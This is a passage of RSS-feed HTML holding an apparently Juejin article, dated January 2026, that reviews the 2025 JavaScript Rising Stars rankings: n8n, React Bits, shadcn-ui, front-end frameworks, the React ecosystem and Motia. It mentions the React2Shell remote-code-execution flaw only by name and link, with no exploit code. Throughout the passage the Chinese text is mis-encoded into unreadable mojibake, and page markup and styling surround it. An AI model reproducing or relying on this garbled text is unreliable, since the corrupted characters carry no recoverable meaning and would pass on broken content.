å…³æ³¨å…¬ä¼—å·ã€Œè½¬è½¬æŠ€æœ¯ã€ï¼ˆç»¼åˆæ€§ï¼‰ã€ã€Œå¤§è½¬è½¬FEã€ï¼ˆä¸“æ³¨äºFEï¼‰ã€ã€Œè½¬è½¬QAã€ï¼ˆä¸“æ³¨äºQAï¼‰ï¼Œæ›´å¤šå¹²è´§å®è·µï¼Œæ¬¢è¿äº¤æµåˆ†äº«~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´æœ€ç«çš„å‰ç«¯é¡¹ç›®å‡ºç‚‰ï¼ŒNo.1 æ˜“ä¸»ï¼]]></title>    <link>https://juejin.cn/post/7592134330313179179</link>    <guid>https://juejin.cn/post/7592134330313179179</guid>    <pubDate>2026-01-07T06:44:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592134330313179179" data-draft-id="7592040819819085865" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´æœ€ç«çš„å‰ç«¯é¡¹ç›®å‡ºç‚‰ï¼ŒNo.1 æ˜“ä¸»ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-07T06:44:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´æœ€ç«çš„å‰ç«¯é¡¹ç›®å‡ºç‚‰ï¼ŒNo.1 æ˜“ä¸»ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T06:44:42.000Z" title="Wed Jan 07 2026 06:44:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    206
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å‰è¨€</h2>
<p>å¿«æ¥çœ‹ï¼JavaScript Rising Stars å…¬å¸ƒäº† <a href="https://link.juejin.cn?target=https%3A%2F%2Frisingstars.js.org%2F2025%2Fen" target="_blank" title="https://risingstars.js.org/2025/en" ref="nofollow noopener noreferrer">2025 å¹´ JavaScript æ˜æ˜Ÿé¡¹ç›®æ¦œå•</a>ã€‚</p>
<p>æ­¤æ¦œå•æ ¹æ® 2025 å¹´ GitHub æ–°å¢çš„æ˜Ÿæ ‡æ•°é‡ï¼Œè¿˜å»ºç«‹äº†ä»¥ä¸‹æ¦œå•ï¼š</p>
<p>æœ€å—æ¬¢è¿çš„é¡¹ç›®ã€å‰ç«¯æ¡†æ¶ã€React ç”Ÿæ€ç³»ç»Ÿã€åç«¯/å…¨æ ˆã€æ„å»ºå·¥å…·ã€äººå·¥æ™ºèƒ½ã€ç§»åŠ¨ç«¯ã€Vue ç”Ÿæ€ç³»ç»Ÿã€çŠ¶æ€ç®¡ç†ã€CSS in JSã€ç»„ä»¶åº“ã€æµ‹è¯•ã€æ¡Œé¢ç«¯ã€é™æ€ç«™ç‚¹ã€GraphQLã€‚</p>
<p>è®©æˆ‘ä»¬çœ‹ä¸€çœ‹éƒ½æ˜¯å“ªäº›é¡¹ç›®ä¸Šæ¦œäº†ã€‚</p>
<h2 data-id="heading-1">2. æœ€å—æ¬¢è¿é¡¹ç›®</h2>
<p>2025 æœ€å—æ¬¢è¿çš„ JavaScript é¡¹ç›® Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ecc272d2c4642718e4c97fdd49be41b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=zjsMca3LufT5Xvmu6eJi44k8u4g%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">2.1. æ€»å† å†›ï¼šn8n ğŸ†</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fn8n.io%2F" target="_blank" title="https://n8n.io/" ref="nofollow noopener noreferrer">n8n</a> æ˜¯ 2025 å¹´çš„ç»å¯¹èµ¢å®¶ï¼Œä¸€å¹´å†…è·å¾—äº†è¶…è¿‡ 112000 ä¸ªæ˜Ÿæ ‡ã€‚è¿‡å¾€ä»æ¥æ²¡æœ‰ä¸€ä¸ªé¡¹ç›®åœ¨ä¸€å¹´å†…è·å¾—å¦‚æ­¤å¤šçš„æ˜Ÿæ ‡ã€‚</p>
<p>n8n æ˜¯ä¸€ä¸ªå·¥ä½œæµè‡ªåŠ¨åŒ–å¹³å°ï¼Œå…·å¤‡åŸç”Ÿ AI åŠŸèƒ½ï¼Œå¯é€šè¿‡å¯è§†åŒ–å·¥ä½œæµè¿æ¥å„ç§åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ã€‚å®ƒçš„æˆåŠŸåæ˜ äº†å¸‚åœºå¯¹æ— ä»£ç è‡ªåŠ¨åŒ–å·¥å…·æ—¥ç›Šå¢é•¿çš„éœ€æ±‚ã€‚</p>
<p>æ­¤å¤–ï¼Œåœ¨å‰ 10 ä¸­è¿˜æœ‰ 3 ä¸ªä¸ AI æœ‰å…³çš„é¡¹ç›®ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fonlook.com%2F" target="_blank" title="https://onlook.com/" ref="nofollow noopener noreferrer">Onlook</a>ï¼šä¸º React åº”ç”¨å¸¦æ¥ AI ä¼˜å…ˆçš„è§†è§‰ç¼–è¾‘åŠŸèƒ½</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdyad.sh%2F" target="_blank" title="https://dyad.sh/" ref="nofollow noopener noreferrer">Dyad</a>ï¼šä¸€æ¬¾å…è´¹ã€æœ¬åœ°åŒ–ã€å¼€æºçš„ AI åº”ç”¨æ„å»ºå™¨ï¼Œä¹Ÿæ˜¯ v0/lovable/Bolt çš„æ›¿ä»£æ–¹æ¡ˆ</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fstagehand.dev%2F" target="_blank" title="https://stagehand.dev/" ref="nofollow noopener noreferrer">Stagehand</a>ï¼šAI é©±åŠ¨çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–</li>
</ul>
<h3 data-id="heading-3">2.2. äºšå†›ï¼šReact Bits</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freactbits.dev%2F" target="_blank" title="https://reactbits.dev/" ref="nofollow noopener noreferrer">React Bits</a> æ˜¯ä¸€ç³»åˆ—ç²¾ç¾çš„ React åŠ¨ç”»ç»„ä»¶ï¼ˆèƒŒæ™¯æ•ˆæœã€æ–‡æœ¬åŠ¨ç”»ã€å¡ç‰‡ç­‰ï¼‰ï¼Œéå¸¸é€‚åˆæ„å»ºä»¤äººå°è±¡æ·±åˆ»çš„ç½‘ç«™ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯ï¼Œå®ƒä»¥ shadcn/ui é¡¹ç›®çš„å½¢å¼åˆ†å‘ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œä» shadcn/ui æ³¨å†Œè¡¨è·å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¼ ç»Ÿçš„å¤åˆ¶ç²˜è´´æ–¹å¼æ·»åŠ åˆ°ä»£ç åº“ä¸­ã€‚</p>
<p>è¯¥æ–‡æ¡£é™„å¸¦ä¸€ä¸ªåå°å·¥ä½œå®¤ï¼Œå¯è®©ä½ è°ƒæ•´å’Œè‡ªå®šä¹‰æ‰€æœ‰ç»„ä»¶çš„è®¾ç½®ï¼ˆé¢œè‰²ã€é€Ÿåº¦ã€ç²’å­æ•°é‡â€¦â€¦ï¼‰ï¼Œå¹¶å°†å…¶å¯¼å‡ºä¸ºä»£ç ç‰‡æ®µï¼Œä½ å¯ä»¥å°†å…¶å¤åˆ¶ç²˜è´´åˆ°ä»£ç åº“ä¸­ã€‚</p>
<h3 data-id="heading-4">2.3. å­£å†›ï¼šshadcn-ui</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fui.shadcn.com%2F" target="_blank" title="https://ui.shadcn.com/" ref="nofollow noopener noreferrer">shadcn-ui</a> æ˜¯ 2023 å¹´å’Œ 2024 å¹´çš„å† å†›ï¼Œ2025 å¹´ä¾ç„¶ä¿æŒäº†å¼ºåŠ²çš„å‘å±•åŠ¿å¤´ã€‚</p>
<p>è¿™æ˜¯ä¸€å¥—è®¾è®¡ç²¾è‰¯ã€æ³¨é‡ç»†èŠ‚ï¼ˆä¾‹å¦‚å¯è®¿é—®æ€§ã€é”®ç›˜äº¤äº’ç­‰ï¼‰ä¸”é£æ ¼ç»Ÿä¸€çš„ React ç»„ä»¶ï¼Œèåˆäº† Radix UIã€TanStack Table ç­‰æ— å¤´ç»„ä»¶çš„ç²¾åâ€¦â€¦</p>
<p>shadcn/ui æœ€ä»¤äººæƒŠå¹çš„ç‰¹ç‚¹æ˜¯ï¼Œå®ƒåœ¨å¼€ç®±å³ç”¨çš„åŠŸèƒ½å’Œå¯å®šåˆ¶æ€§ä¹‹é—´æ‰¾åˆ°äº†æœ€ä½³å¹³è¡¡ç‚¹ã€‚</p>
<h2 data-id="heading-5">3. å‰ç«¯æ¡†æ¶</h2>
<p>å‰ç«¯æ¡†æ¶ Top 15 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90422fbb0d724cc19205216d2cec76e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=IKkAba%2BumSs4gSiR3MmwuS0ArIw%3D" alt="" loading="lazy"/></p>
<p>React é‡æ–°å¤ºå›äº† 2024 å¹´è¢« htmx å¤ºèµ°çš„ç‹å† ã€‚</p>
<p>è™½ç„¶æœ‰å…³äº Solid æˆ– Svelte ç­‰æ›¿ä»£æ–¹æ¡ˆæ˜¯å¦æ›´é€‚åˆæ–°é¡¹ç›®çš„äº‰è®ºï¼Œä½†å› ä¸º LLMs åŸºäº React ä»£ç åº“è¿›è¡Œè®­ç»ƒï¼Œä½¿å¾—è¿™äº›æ›¿ä»£æ–¹æ¡ˆå¾ˆéš¾è·å¾—å¸‚åœºä»½é¢ã€‚</p>
<p>React 19 å¼•å…¥äº†é‡å¤§æ”¹è¿›ï¼ŒåŒ…æ‹¬ <strong>Activity API</strong> å’Œç”¨äºç®¡ç†ç”¨æˆ·äº‹ä»¶çš„å¢å¼ºå‹ hooksã€‚</p>
<p>è¯´åˆ° effectsï¼ŒCloudflare å› ä¸ºé”™è¯¯ä½¿ç”¨ useEffect ï¼Œå¯¼è‡´æ— é™è°ƒç”¨å…¶ API ï¼Œæœ€ç»ˆå¯¼è‡´è‡ªèº«é­å— DDoS æ”»å‡»ï¼Œé€ æˆäº†æœåŠ¡ä¸­æ–­ã€‚</p>
<p>React å‘æœåŠ¡å™¨ç«¯è¿ç§»ï¼Œæ¨å‡ºäº† React Server Componentsï¼Œè¿™æ˜¯è¿‘å¹´æ¥æœ€å¤§çš„å˜é©ã€‚ç„¶è€Œï¼Œè¿™ç§å˜é©ä¹Ÿå¸¦æ¥äº†å·¨å¤§çš„åŠŸèƒ½å’Œé£é™©ï¼Œä¾‹å¦‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Freact2shell.com%2F" target="_blank" title="https://react2shell.com/" ref="nofollow noopener noreferrer">React2Shell</a> æ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ª React Server Components ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ï¼Œéœ€è¦ç´§æ€¥å‘å¸ƒè¡¥ä¸è¿›è¡Œä¿®å¤ã€‚ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">2025 å¹´ 12 æœˆ 3 æ—¥</a>ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F11%2Fdenial-of-service-and-source-code-exposure-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/11/denial-of-service-and-source-code-exposure-in-react-server-components" ref="nofollow noopener noreferrer">2025 å¹´ 12 æœˆ 11 æ—¥ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fripplejs.com%2F" target="_blank" title="https://ripplejs.com/" ref="nofollow noopener noreferrer">Ripple</a> ä½åˆ—ç¬¬äºŒï¼Œæ˜¯å‰äº”åä¸­çš„æ–°ç§€ã€‚å®ƒæ˜¯ä¸€ä¸ªå…¨æ–°çš„ UI æ¡†æ¶ï¼Œèåˆäº† Reactã€Solid å’Œ Svelte çš„ä¼˜ç‚¹ã€‚å®ƒæ‹¥æœ‰å“åº”å¼åŸè¯­ã€ç»„ä»¶åŒ–æ¶æ„å’Œæ¨¡æ¿è¯­æ³•ã€‚</p>
<p>ç›®å‰ä»å¤„äºæ—©æœŸå¼€å‘é˜¶æ®µã€‚React æœ‰ Next.jsï¼ŒVue.js æœ‰ Nuxtï¼ŒSvelte æœ‰ SvelteKitï¼ŒSolid æœ‰ SolidStartâ€¦â€¦Ripple æ˜¯å¦ä¹Ÿä¼šæœ‰è‡ªå·±çš„å…ƒæ¡†æ¶æ¥å¤„ç†æœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼Ÿ</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fsvelte.dev%2F" target="_blank" title="https://svelte.dev/" ref="nofollow noopener noreferrer">Svelte</a> è¿ç»­ç¬¬ä¸‰å¹´ä½åˆ—ç¬¬ä¸‰ã€‚Svelte 5 çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsvelte.dev%2Fdocs%2Fsvelte%2Fwhat-are-runes" target="_blank" title="https://svelte.dev/docs/svelte/what-are-runes" ref="nofollow noopener noreferrer">Runes</a> å“åº”å¼ç³»ç»Ÿï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">stateã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">ã€</span></span></span></span></span>derivedã€$effectï¼‰å·²æˆä¸ºçŠ¶æ€ç®¡ç†çš„æ ‡å‡†æ–¹å¼ã€‚</p>
<h2 data-id="heading-6">4. React ç”Ÿæ€ç³»ç»Ÿ</h2>
<p>React ç”Ÿæ€ç³»ç»Ÿ Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b58e5280c2f14b13944b16bce0e4d57e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=%2BuiZO2m0aA070ZZbawNXNJlZNSY%3D" alt="" loading="lazy"/></p>
<p>2025 å¹´ï¼ŒReact ç”Ÿæ€ç³»ç»Ÿè¿æ¥äº†ä¸€ä¸ªæ˜æ˜¾çš„è½¬æŠ˜ç‚¹ï¼Œå…¶æ ¸å¿ƒåœ¨äºä¸€ä¸ªé•¿æœŸå­˜åœ¨çš„çŸ›ç›¾ï¼šæ—¥ç›Šå¼ºå¤§çš„æœåŠ¡å™¨ç«¯åŠŸèƒ½ä¸ä¿æŒå®¢æˆ·ç«¯å¼€å‘ç®€æ´æ€§å’Œå¯é¢„æµ‹æ€§ä¹‹é—´çš„å†²çªã€‚</p>
<p>åœ¨ Next.js çš„å¼•é¢†ä¸‹ï¼ŒReact å‘æœåŠ¡å™¨ç»„ä»¶ã€æœåŠ¡å™¨å‡½æ•°å’Œæµå¼ä¼ è¾“çš„è½¬å‹ï¼Œå¼€å¯äº†æ€§èƒ½å’Œæ¶æ„æ–¹é¢çš„æ–°å¯èƒ½ã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿™ç§è½¬å˜ä¹Ÿå¼•å…¥äº†ä¸€ç§æ–°çš„æ€ç»´æ¨¡å¼ï¼šç†è§£å®¢æˆ·ç«¯-æœåŠ¡å™¨è¾¹ç•Œã€æ•°æ®ç”Ÿå‘½å‘¨æœŸå’Œæ¸²æŸ“é˜¶æ®µå¯¹äºæ—¥å¸¸å¼€å‘è‡³å…³é‡è¦ã€‚</p>
<p>ç¤¾åŒºå¯¹æ­¤ååº”ä¸ä¸€ã€‚</p>
<p>ä¸€äº›äººæ¬£ç„¶æ¥å—æ–°çš„æœåŠ¡å™¨ä¼˜å…ˆæ–¹å‘ï¼Œè®¤ä¸ºè¿™æ˜¯ React çš„è‡ªç„¶æ¼”è¿›ï¼›è€Œå¦ä¸€äº›äººåˆ™è´¨ç–‘ï¼Œè¿™ç§å¢åŠ çš„å¤æ‚æ€§æ˜¯å¦å€¼å¾—ç”¨äºæ—¥å¸¸ UI å¼€å‘ã€‚å›´ç»•æœåŠ¡å™¨åŠŸèƒ½å’Œè¯·æ±‚è¾¹ç•Œçš„å®‰å…¨äº‹ä»¶è¿›ä¸€æ­¥åŠ å‰§äº†è¿™åœºäº‰è®ºã€‚è¿™äº›äº‹ä»¶æš´éœ²äº†é«˜åº¦æŠ½è±¡çš„å…¨æ ˆæ¨¡å¼å¸¦æ¥çš„é£é™©ï¼ŒåŒæ—¶ä¹Ÿè¡¨æ˜äº†å¦ä¸€ä»¶äº‹ï¼šReact çš„æœåŠ¡å™¨ç«¯æ¨¡å‹å·²ç»è¾¾åˆ°äº†å®é™…åº”ç”¨çš„ç¨‹åº¦ï¼Œå…¶å‡è®¾æ­£åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ¥å—å‹åŠ›æµ‹è¯•ã€å®¡è®¡å’ŒæŒ‘æˆ˜ã€‚</p>
<p>åœ¨æ­¤èƒŒæ™¯ä¸‹ï¼ŒTanStack Start å› å…¶ä»¥æ›´ä»¥å®¢æˆ·ç«¯ä¸ºä¸­å¿ƒï¼ˆä¸”åŒæ„ï¼‰çš„è§†è§’çœ‹å¾… React çš„æ–°åŠŸèƒ½è€Œå¤‡å—å…³æ³¨ï¼Œå®ƒä¼˜å…ˆè€ƒè™‘æ¸…æ™°æ€§ã€ç±»å‹å®‰å…¨æ€§å’Œæ˜¾å¼æ§åˆ¶ã€‚è¿™è‡ªç„¶è€Œç„¶åœ°å°†è®¨è®ºçš„ç„¦ç‚¹ä»æ¡†æ¶æœ¬èº«è½¬ç§»åˆ°äº†å…³äºå¼€å‘è€…åº”è¯¥æ¥å—å¤šå°‘æŠ½è±¡ä»¥åŠå¤æ‚æ€§çœŸæ­£å½’å±çš„ç†å¿µä¹‹äº‰ï¼Œè€ŒéåŠŸèƒ½ç«èµ›ã€‚</p>
<h2 data-id="heading-7">5. åç«¯ / å…¨æ ˆ</h2>
<p>åç«¯ / å…¨æ ˆ Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be8bf6275d4f4099819c15ebdebc0538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=2FvvI6OV6kflCtxxUCFhWgmy3NQ%3D" alt="" loading="lazy"/></p>
<p>ä¸€æ¬¾æ–°æ™‹äº§å“è£è·åç«¯/å…¨æ ˆç±»åˆ«å† å†›ï¼</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmotia.dev%2F" target="_blank" title="https://motia.dev/" ref="nofollow noopener noreferrer">Motia</a> ä»£è¡¨äº†åç«¯å·¥ç¨‹é¢†åŸŸçš„èŒƒå¼è½¬å˜ï¼Œå®ƒå°†ä»¥å¾€éœ€è¦å¤šä¸ªç‹¬ç«‹æ¡†æ¶æ‰èƒ½å®ç°çš„åŠŸèƒ½æ•´åˆåˆ°ä¸€ä¸ªç³»ç»Ÿä¸­ã€‚ç”¨æˆ·æ— éœ€å†ä¸º APIã€åå°ä»»åŠ¡ã€é˜Ÿåˆ—ã€å·¥ä½œæµã€æ•°æ®æµå’Œ AI ä»£ç†ç­‰å„ç§å·¥å…·è€Œçƒ¦æ¼ï¼ŒMotia æä¾›äº†ä¸€ä¸ªæ¶µç›–æ‰€æœ‰åç«¯åŠŸèƒ½çš„ç»Ÿä¸€æ¡†æ¶ã€‚</p>
<p>Motia çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨åä¸ºâ€œæ­¥éª¤â€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.motia.dev%2Fdocs%2Fconcepts%2Fsteps" target="_blank" title="https://www.motia.dev/docs/concepts/steps" ref="nofollow noopener noreferrer">ï¼ˆStepsï¼‰</a>çš„åŸºæœ¬å•å…ƒï¼Œå®ƒæ˜¯ä¸€ç§å•ä¸€çš„æŠ½è±¡æ¦‚å¿µï¼Œå®šä¹‰äº†ä»£ç çš„è¿è¡Œæ–¹å¼ã€è¿è¡Œæ—¶é—´ã€è¿è¡Œåœ°ç‚¹ä»¥åŠè¿è¡Œå†…å®¹ã€‚æ¯ä¸ªæ­¥éª¤éƒ½åŒ…å«ä¸€ä¸ªé…ç½®ï¼ˆç”¨äºå®šä¹‰è§¦å‘å™¨ã€è·¯å¾„å’Œè®¡åˆ’ä»»åŠ¡ï¼‰å’Œä¸€ä¸ªå¤„ç†ç¨‹åºï¼ˆç”¨äºæ‰§è¡Œä¸šåŠ¡é€»è¾‘ï¼‰ã€‚æ›´æ”¹æ­¥éª¤ç±»å‹ï¼Œç›¸åŒçš„æ¨¡å¼å³å¯åº”ç”¨äºä¸åŒçš„ç”¨ä¾‹ï¼šAPI ç«¯ç‚¹ã€äº‹ä»¶å¤„ç†ç¨‹åºæˆ–å®šæ—¶ä»»åŠ¡ã€‚</p>
<p>æ­¥éª¤å¯ä»¥ç”¨ TypeScript æˆ– Python ç¼–å†™ã€‚å®ƒè¿˜é€šè¿‡ Workbench æä¾›å†…ç½®çš„å¯è§‚å¯Ÿæ€§ï¼ŒWorkbench æ˜¯ä¸€ä¸ªå¯è§†åŒ–æ§åˆ¶é¢æ¿ï¼Œç”¨äºç®¡ç†ã€è°ƒè¯•å’Œè§‚å¯Ÿè¿è¡Œæƒ…å†µï¼Œæ­¤å¤–è¿˜å†…ç½®äº†çŠ¶æ€ç®¡ç†å’Œæµå¼ä¼ è¾“åŠŸèƒ½ã€‚</p>
<p>æ¥ä¸‹æ¥çš„ 4 ä¸ªé¡¹ç›®ä¸ 2024 å¹´ç›¸åŒï¼Œåªæ˜¯ Hono å’Œ Astro çš„ä½ç½®äº’æ¢äº†ã€‚</p>
